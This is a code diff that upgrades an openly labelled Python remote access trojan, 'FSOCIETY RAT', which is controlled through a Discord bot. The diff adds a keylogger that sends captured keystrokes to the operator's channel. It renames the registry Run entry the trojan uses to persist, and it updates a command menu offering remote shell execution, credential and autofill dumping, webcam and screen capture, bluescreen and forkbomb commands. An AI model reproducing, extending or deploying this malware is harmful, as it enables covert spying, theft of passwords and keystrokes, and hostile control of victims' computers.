@@ -14,6 +14,7 @@ import requests
 import pyttsx3
 import psutil
 import socket
+from pynput import keyboard
 import subprocess
 from Access.screenshot import *
 from Access.webcam import *
@@ -24,8 +25,8 @@ if sys.platform.startswith('win') and sys.version_info >= (3, 8):
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 ##################################################################################
-token = "yourtoken"
-id = 12345
+token = "777"
+id = 777
 ##################################################################################
 
 intents = discord.Intents.all()
@@ -105,45 +106,51 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
         embed = discord.Embed(title="", description=f"# FSOCIETY RAT", color=0x010101)
         embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
         embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
-        embed.set_footer(text="FSOCIETY RAT V1")
+        embed.set_footer(text="FSOCIETY RAT V2")
 
         await session.send(content='@everyone', embed=embed)
     else: 
         embed = discord.Embed(title="", description=f"# RECONNECTION", color=0x010101)
         embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
         embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
-        embed.set_footer(text="FSOCIETY RAT V1")
+        embed.set_footer(text="FSOCIETY RAT V2")
 
         await session.send(content='@everyone', embed=embed)
 
 @bot.command()
 async def help(ctx):
     helps = """
-FSOCIETY RAT commands line:
+FSOCIETY RAT V2 commands line:
 
 System Access:
 
 !startup               : Add autostart
 !execute <commands>    : Run shell command
 !cd <directory>        : Change directory
-!sysinfo               : Get system info
-!open <link>           : Open a web browser
-!bsod                  : Trigger bluescreen
+!process               : List running processes
+!processkill <pid>     : Kill a process by PID
 !shutdown              : Shutdown the system
 !restart               : Restart the system
+!keylog                : Start Keylogger (NEW!)
+!stoplog               : Stop Keylogger  (NEW!)
+
+System Information:
+!ip                    : Get public IP info
+!sysinfo               : Get system info
+
+Troll Access:
+
+!open <link>           : Open a web browser
+!bsod                  : Trigger bluescreen
 !msgbox <title> <text> : Show message box
 !textspech <text>      : text to speech
 !wallpaper             : Set wallpaper attach image
-!ip                    : Get public IP info
-!download <path>       : Download file from target
-!upload                : Upload file to target
-!process               : List running processes
-!processkill <pid>     : Kill a process by PID
 !forkbomb              : Rabbit Virus
 
 Device Access:
 
 !screenshot            : Take a screenshot
+!record                : Record pc screen 30 sec
 !webcam                : Capture webcam image
 
 Credential Dump:
@@ -152,6 +159,45 @@ Credential Dump:
 !autofill              : Dump saved autofill data
     """
     await ctx.send(f"```{helps}```")
+
+key = None
+log = []
+
+@bot.command()
+async def keylog(ctx):
+    global key, log
+    
+    log = []
+    
+    def on_press(key):
+        try:
+            log.append(key.char)
+        except AttributeError:
+            pass
+    
+    key = keyboard.Listener(on_press=on_press)
+    key.start()
+    embed = discord.Embed(title="", description="# FSOCIETY RAT", color=0x010101)
+    embed.add_field(name="!keylog", value="Keylogger Start", inline=False)
+    embed.add_field(name="!stoplog", value="Stop Keylogger", inline=False)
+    embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
+    embed.set_footer(text="FSOCIETY RAT V2")
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def dx(ctx):
+    webbrowser.open('https://media.tenor.com/vIDEYg2D4P4AAAAM/suck-it-tripled-h.gif')
+    await ctx.send('```success```')
+
+@bot.command()
+async def stoplog(ctx):
+    global key
+    key.stop()
+    embed = discord.Embed(title="", description="# FSOCIETY RAT", color=0x010101)
+    embed.add_field(name="", value=f"{''.join(log)}", inline=False)
+    embed.set_image(url="https://images-ext-1.discordapp.net/external/qQQj0lHwHpagTONe7CKJss7dSIGTBbP3Dd8Rbrx2O4Q/%3Fv%3D1734164728/https/cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?format=webp")
+    embed.set_footer(text="FSOCIETY RAT V2")
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def execute(ctx, *, cmd):
@@ -203,7 +249,7 @@ async def bsod(ctx):
 
 @bot.command()
 async def startup(ctx):
-    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows" /t REG_SZ /d "{sys.executable}" /f')
+    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Letriume" /t REG_SZ /d "{sys.executable}" /f')
     await ctx.send("success")
 
 @bot.command()
